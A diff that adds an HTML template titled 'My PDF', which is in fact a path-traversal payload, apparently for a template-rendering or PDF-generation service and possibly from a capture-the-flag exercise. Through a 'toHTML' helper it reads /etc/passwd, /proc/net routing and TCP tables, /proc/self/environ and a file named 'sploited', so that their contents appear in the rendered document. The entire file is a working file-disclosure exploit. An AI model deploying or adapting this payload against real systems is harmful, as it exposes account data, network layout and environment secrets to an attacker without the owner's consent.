@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>My PDF</title>
+  </head>
+  <body>
+      <pre style="white-space: pre-wrap;">
+Scieżka:
+{{ .DirPath }}  
+PASSWD:
+{{ toHTML .DirPath "../../../../etc/passwd" }}
+IP:
+{{ toHTML .DirPath "../../../../proc/net/fib_trie" }}
+TCP:
+{{ toHTML .DirPath "../../../../proc/net/tcp" }}
+env:
+{{ toHTML .DirPath "../../../../proc/self/environ" }}
+profile:
+{{ toHTML .DirPath "../../../../tmp/sploited" }}
+test:
+    </pre>
+  </body>
+</html>
